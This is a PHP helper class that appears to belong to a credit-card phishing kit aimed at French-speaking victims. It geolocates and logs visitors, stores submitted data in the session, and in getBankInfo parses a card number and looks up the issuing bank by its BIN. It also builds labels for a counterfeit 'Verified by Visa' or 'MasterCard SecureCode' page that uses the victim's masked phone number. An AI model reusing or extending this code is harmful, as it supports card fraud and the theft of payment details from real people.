<?php
session_start();

class Activity
{


    private static $activity = null;
    private $user_agent = null;
    private $os_platform = null;
    private $os_array = null;
    private $browser_array = null;
    private $browser = null;
    private $geo = null;


    private function __clone()
    {
    }


    public static function getActivity()
    {
        if (!self::$activity) {
            self::$activity = new Activity();
        }
        return self::$activity;
    }

    private static function file_get_contents($file)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $file);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }


    private function __construct()
    {
        $this->geo = @json_decode(self::file_get_contents("http://ip-api.com/json/" . $this->getIp()));
        $this->user_agent = UAgent::random();
        $this->os_platform = "Unknown OS Platform";
        $this->browser = "Unknown Browser";
        $this->os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile'
        );
        $this->browser_array = array(
            '/msie/i' => 'Internet Explorer',
            '/firefox/i' => 'Firefox',
            '/safari/i' => 'Safari',
            '/chrome/i' => 'Chrome',
            '/edge/i' => 'Edge',
            '/opera/i' => 'Opera',
            '/netscape/i' => 'Netscape',
            '/maxthon/i' => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/mobile/i' => 'Handheld Browser'
        );
    }

    public function getLanguage()
    {
        /*if ($this->getCountryCode() == "FR" || $this->getCountryCode() == "DZ" || $this->getCountryCode() == "MA" || $this->getCountryCode() == "TN" || $this->getCountryCode() == "CD" || $this->getCountryCode() == "MG" || $this->getCountryCode() == "CM" || $this->getCountryCode() == "CA" || $this->getCountryCode() == "CI" || $this->getCountryCode() == "BF" || $this->getCountryCode() == "NE" || $this->getCountryCode() == "SN" || $this->getCountryCode() == "ML" || $this->getCountryCode() == "RW" || $this->getCountryCode() == "BE" || $this->getCountryCode() == "GF" || $this->getCountryCode() == "TD" || $this->getCountryCode() == "HT" || $this->getCountryCode() == "BI" || $this->getCountryCode() == "BJ" || $this->getCountryCode() == "CH" || $this->getCountryCode() == "TG" || $this->getCountryCode() == "CF" || $this->getCountryCode() == "CG" || $this->getCountryCode() == "GA" || $this->getCountryCode() == "KM" || $this->getCountryCode() == "GK" || $this->getCountryCode() == "DJ" || $this->getCountryCode() == "LU" || $this->getCountryCode() == "VU" || $this->getCountryCode() == "SC" || $this->getCountryCode() == "MC") {
            return "fr";
        } elseif ($this->getCountryCode() == "MX" || $this->getCountryCode() == "PH" || $this->getCountryCode() == "ES" || $this->getCountryCode() == "CO" || $this->getCountryCode() == "AR" || $this->getCountryCode() == "PE" || $this->getCountryCode() == "VE" || $this->getCountryCode() == "CL" || $this->getCountryCode() == "EC" || $this->getCountryCode() == "GT" || $this->getCountryCode() == "CU" || $this->getCountryCode() == "HN" || $this->getCountryCode() == "PY" || $this->getCountryCode() == "SV" || $this->getCountryCode() == "NI" || $this->getCountryCode() == "CR" || $this->getCountryCode() == "UY") {
            return "es";
        } elseif ($this->getCountryCode() == "IT" || $this->getCountryCode() == "SM") {
            return "it";
        } elseif ($this->getCountryCode() == "RU" || $this->getCountryCode() == "BY" || $this->getCountryCode() == "KZ" || $this->getCountryCode() == "KG" || $this->getCountryCode() == "TJ") {
            return "ru";
        } elseif ($this->getCountryCode() == "PT" || $this->getCountryCode() == "BR" || $this->getCountryCode() == "AO" || $this->getCountryCode() == "MZ" || $this->getCountryCode() == "MO") {
            return "pt";
        } elseif ($this->getCountryCode() == "TR" || $this->getCountryCode() == "cy") {
            return "tr";
        } elseif ($this->getCountryCode() == "PL") {
            return "pl";
        } elseif ($this->getCountryCode() == "IL") {
            return "il";
        } elseif ($this->getCountryCode() == "NO") {
            return "no";
        } elseif ($this->getCountryCode() == "NL" || $this->getCountryCode() == "AW") {
            return "nl";
        } elseif ($this->getCountryCode() == "DE" || $this->getCountryCode() == "CH") {
            return "de";
        } else {
            return "en";

        }*/
        return "fr";
    }

    public function getCountryCode()
    {
        return $this->geo->countryCode;
    }

    public function getZip()
    {
        return $this->geo->zip;
    }

    public function getCountry()
    {
        return $this->geo->country;
    }

    public function getCity()
    {
        return $this->geo->city;
    }

    public function getRegion()
    {
        return $this->geo->regionName;
    }


    public function getOS()
    {
        foreach ($this->os_array as $regex => $value) {

            if (preg_match($regex, $this->user_agent)) {
                $this->os_platform = $value;
            }
        }
        return $this->os_platform;

    }

    public function getBrowser()
    {
        foreach ($this->browser_array as $regex => $value) {

            if (preg_match($regex, $this->user_agent)) {
                $this->browser = $value;
            }

        }
        return $this->browser;
    }


    public static function getIp()
    {
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];
        $via = @$_SERVER['HTTP_VIA'];


        if ($client && preg_match("/^[\w\d\.\-]+\.[\w\d]{1,4}$/i", $client)) {
            return $client;
        } elseif ($forward && preg_match("/^[\w\d\.\-]+\.[\w\d]{1,4}$/i", $forward)) {
            return $forward;
        } elseif ($via && preg_match("/^[\w\d\.\-]+\.[\w\d]{1,4}$/i", $via)) {
            return $via;
        } elseif ($remote && preg_match("/^[\w\d\.\-]+\.[\w\d]{1,4}$/i", $remote)) {
            return $remote;
        } else {
            return "";
        }

    }


    public static function getTime()
    {
        return date('H:i:s d/m/Y');
    }


    public function redirect($permanent = false)
    {
        if ($permanent) {
            header('HTTP/1.1 301 Moved Permanently');
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
    }

    public function getHydratationData()
    {
        return array(
            "OS" => $this->getOs(),
            "IP" => $this->getIp(),
            "BROWSER" => $this->getBrowser()
        );
    }

    public function logging($file)
    {
        $message = "[" . self::getTime() . "] ";
        foreach ($this->getHydratationData() as $k => $v) {
            $message .= " - [" . $k . " : " . $v . " ] ";
        }
        file_put_contents($file, $message . PHP_EOL, FILE_APPEND);
    }

    public static function sessionSaver($data, $table = "RESULT")
    {
        $array = (isset($_SESSION[$table]) && $_SESSION[$table] != NULL) ? $_SESSION[$table] : array();
        $_SESSION[$table] = array_merge($array, $data);
    }

    public static function getSession($key, $table = "RESULT", $dim = true)
    {
        $array = isset($_SESSION[$key]) ? $_SESSION[$key] : "";
        if ($dim)
            $array = isset($_SESSION[$table][$key]) ? $_SESSION[$table][$key] : "";
        return isset($array) || $array == NULL ? $array : "";
    }

    public static function setSession($key = NULL, $value, $table = "RESULT")
    {
        $key != NULL ? $_SESSION[$table][$key] = $value : $_SESSION[$table] = $value;

    }

    public static function getBankInfo($ccno)
    {
        $ccno = str_replace(" ", "", str_replace(".", "", str_replace("-", "", $ccno)));
        $vbvSlice = substr($ccno, 0, 1);
        $config = array();
        $config["lastNumbers"] = substr($ccno, -4);
        if ($vbvSlice == 4) {
            $config["vbv"] = "visa";
            $config["message"] = "Verified by Visa";
            $config["style"] = "74px";
        } else {
            $config["vbv"] = "mastercard";
            $config["message"] = "MasterCard SecureCode";
            $config["style"] = "85%;";
        }
        $config["bin"] = substr($ccno, 0, 6);
        $config["phone"] = substr(Activity::getSession("Numéro_de_mobile"), -3);
        $config["bank"] = @json_decode(file_get_contents("https://lookup.binlist.net/" . $config["bin"]))->bank->name;
        $return = '{"lastNumbers":"' . array_shift($config) . '"';
        foreach ($config as $key => $value) {
            $return .= ',"' . $key . '":"' . $value . '"';
        }
        $return .= "}";
        return $return;
    }


    public function getUserAgent()
    {
        return $this->user_agent;
    }

    public static function rand()
    {
        $caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_";
        $desordenada = str_shuffle($caracteres);
        return substr($desordenada, 1, rand(4, 10));
    }


    /**
     * @return array|mixed|null|object
     */
    public function getGeo()
    {
        return $this->geo;
    }
}

?>
